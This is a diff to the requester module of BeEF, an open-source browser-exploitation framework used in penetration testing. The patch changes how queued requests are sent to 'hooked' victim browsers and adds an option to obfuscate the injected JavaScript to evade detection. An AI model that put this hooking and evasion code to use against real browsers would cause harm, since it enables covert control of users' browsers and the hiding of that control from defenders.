@@ -1,5 +1,5 @@
 #
-# Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
+# Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
 # Browser Exploitation Framework (BeEF) - http://beefproject.com
 # See the file 'doc/COPYING' for copying permission
 #
@@ -20,7 +20,7 @@ module BeEF
             @body = body
             # Generate all the requests and output them to the hooked browser
             output = []
-            BeEF::Core::Models::Http.all(:hooked_browser_id => hb.id, :has_ran => "waiting").each { |h|
+            BeEF::Core::Models::Http.all(:hooked_browser_id => hb.session, :has_ran => "waiting").each { |h|
               output << self.requester_parse_db_request(h)
             }
 
@@ -28,18 +28,30 @@ module BeEF
             config = BeEF::Core::Configuration.instance
             ws = BeEF::Core::Websocket::Websocket.instance
 
-            # todo antisnatchor: prevent sending "content" multiple times. Better leaving it after the first run, and don't send it again.
-            #todo antisnatchor: remove this gsub crap adding some hook packing.
+            if config.get("beef.extension.evasion.enable")
+              evasion = BeEF::Extension::Evasion::Evasion.instance
+            end
+
+
+            # todo antisnatchor: prevent sending "content" multiple times.
+            #                    Better leaving it after the first run, and don't send it again.
+            # todo antisnatchor: remove this gsub crap adding some hook packing.
+
+            # If we use WebSockets, just reply wih the component contents
             if config.get("beef.http.websocket.enable") && ws.getsocket(hb.session)
               content = File.read(find_beefjs_component_path 'beef.net.requester').gsub('//
-              //   Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
+              //   Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
               //   Browser Exploitation Framework (BeEF) - http://beefproject.com
               //   See the file \'doc/COPYING\' for copying permission
               //', "")
               add_to_body output
-              ws.send(content + @body,hb.session)
-               #if we use WebSockets, just reply wih the component contents
-            else # if we use XHR-polling, add the component to the main hook file
+              if config.get("beef.extension.evasion.enable")
+                ws.send(evasion.obfuscate(content) + @body, hb.session)
+              else
+                ws.send(content + @body, hb.session)
+              end
+            # if we use XHR-polling, add the component to the main hook file
+            else
               build_missing_beefjs_components 'beef.net.requester'
               # Send the command to perform the requests to the hooked browser
               add_to_body output
@@ -47,13 +59,22 @@ module BeEF
           end
 
           def add_to_body(output)
-            @body << %Q{
+            config = BeEF::Core::Configuration.instance
+
+            req = %Q{
                 beef.execute(function() {
                   beef.net.requester.send(
                     #{output.to_json}
                   );
                 });
               }
+
+            if config.get("beef.extension.evasion.enable")
+              evasion = BeEF::Extension::Evasion::Evasion.instance
+              @body << evasion.obfuscate(req)
+            else
+              @body << req
+            end
           end
 
           #
